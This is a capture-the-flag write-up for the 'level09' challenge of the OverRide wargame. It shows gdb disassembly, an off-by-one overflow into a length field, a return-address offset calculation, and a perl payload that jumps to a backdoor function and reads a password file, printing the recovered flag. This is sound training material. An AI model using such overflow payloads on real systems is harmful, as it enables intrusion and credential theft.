# level09

The program reads a username and a message from stdin. It also has a secret function `secret_backdoor`.

## Step 1. Mesure struct size
```assembly
level09@OverRide:~$ gdb -batch -ex "set disassembly-flavor intel" -ex "disassemble handle_msg" level09
Dump of assembler code for function handle_msg:
   0x00000000000008c0 <+0>:	push   rbp
   0x00000000000008c1 <+1>:	mov    rbp,rsp
   0x00000000000008c4 <+4>:	sub    rsp,0xc0
   0x00000000000008cb <+11>:	lea    rax,[rbp-0xc0]		; 192 bytes
   0x00000000000008d2 <+18>:	add    rax,0x8c			; 140 bytes
   0x00000000000008d8 <+24>:	mov    QWORD PTR [rax],0x0
   0x00000000000008df <+31>:	mov    QWORD PTR [rax+0x8],0x0
   0x00000000000008e7 <+39>:	mov    QWORD PTR [rax+0x10],0x0
   0x00000000000008ef <+47>:	mov    QWORD PTR [rax+0x18],0x0
   0x00000000000008f7 <+55>:	mov    QWORD PTR [rax+0x20],0x0 ; 40 bytes set to 0
   0x00000000000008ff <+63>:	mov    DWORD PTR [rbp-0xc],0x8c ; 8 bytes
[...]
```
```c
struct mystruct
{
	char first[140];
	char second[40];
	int third;
};
```
According to the disassembly, the program defines a structure like this in the `handle_msg` function.

## Step 2. Find spot to overwrite
``` assembly
level09@OverRide:~$ gdb -batch -ex "set disassembly-flavor intel" -ex "disassemble set_username" level09
[...]
   0x0000000000000a3d <+112>:	mov    DWORD PTR [rbp-0x4],0x0	; initialize i = 0
   0x0000000000000a44 <+119>:	jmp    0xa6a <set_username+157>
   0x0000000000000a46 <+121>:	mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000000a49 <+124>:	cdqe
   0x0000000000000a4b <+126>:	movzx  ecx,BYTE PTR [rbp+rax*1-0x90]
   0x0000000000000a53 <+134>:	mov    rdx,QWORD PTR [rbp-0x98]
   0x0000000000000a5a <+141>:	mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000000a5d <+144>:	cdqe
   0x0000000000000a5f <+146>:	mov    BYTE PTR [rdx+rax*1+0x8c],cl
   0x0000000000000a66 <+153>:	add    DWORD PTR [rbp-0x4],0x1	; ++i
   0x0000000000000a6a <+157>:	cmp    DWORD PTR [rbp-0x4],0x28
   0x0000000000000a6e <+161>:	jg     0xa81 <set_username+180>	; if i > 40 break loop
   0x0000000000000a70 <+163>:	mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000000a73 <+166>:	cdqe
   0x0000000000000a75 <+168>:	movzx  eax,BYTE PTR [rbp+rax*1-0x90]
   0x0000000000000a7d <+176>:	test   al,al
   0x0000000000000a7f <+178>:	jne    0xa46 <set_username+121>
```
```c
for (int i = 0; i <= 40; ++i)
	// copy buffer to struct
```
In the `set_username` function, the program copy 41 bytes from input buffer to second element of the structure whose size is 40 bytes. So 41st byte overwrite third element of the structure. Now we can overwrite third element who can control how many bytes we can copy to first element of the structure.

## Step 3. Calculate offset to overwrite `rip`
```assembly
[...]
   0x0000555555554906 <+70>:	lea    rax,[rbp-0xc0]
   0x000055555555490d <+77>:	mov    rdi,rax
=> 0x0000555555554910 <+80>:	call   0x5555555549cd <set_username>
   0x0000555555554915 <+85>:	lea    rax,[rbp-0xc0]
   0x000055555555491c <+92>:	mov    rdi,rax
   0x000055555555491f <+95>:	call   0x555555554932 <set_msg>
[...]
```
```
level09@OverRide:~$ gdb -q level09
(gdb) break *0x0000555555554910
Breakpoint 1 at 0x555555554910
(gdb) run
Starting program: /home/users/level09/level09
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------

Breakpoint 1, 0x0000555555554910 in handle_msg ()
(gdb) info registers rax
rax            0x7fffffffe500	140737488348416
(gdb) info frame
Stack level 0, frame at 0x7fffffffe5d0:
 rip = 0x555555554910 in handle_msg; saved rip 0x555555554abd
 called by frame at 0x7fffffffe5e0
 Arglist at 0x7fffffffe5c0, args:
 Locals at 0x7fffffffe5c0, Previous frame's sp is 0x7fffffffe5d0
 Saved registers:
  rbp at 0x7fffffffe5c0, rip at 0x7fffffffe5c8
(gdb) print 0x7fffffffe5c8 - 0x7fffffffe500
$1 = 200
```
We set a breakpoint before calling `set_username`, then got offset `200` by calculating `rip - rax`.

## Step 4. Find the address of secret backdoor function
```
level09@OverRide:~$ gdb -batch -ex "info functions secret_backdoor" level09
0x000000000000088c  secret_backdoor
```
```
level09@OverRide:~$ gdb -q level09
(gdb) break main
Breakpoint 1 at 0xaac
(gdb) run
Starting program: /home/users/level09/level09

Breakpoint 1, 0x0000555555554aac in main ()
(gdb) info functions secret_backdoor
0x000055555555488c  secret_backdoor
```
We thought that the binary was compiled with PIE(position-independent executable) option. The absolute address of function must be found at runtime.

## Final step. Build payload
```
level09@OverRide:~$ perl -e 'print "A"x40 . "\xff" . "\n" . "A"x200 . "\x8c\x48\x55\x55\x55\x55\x00\x00" . "\n" . "cat /home/users/end/.pass"' | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```
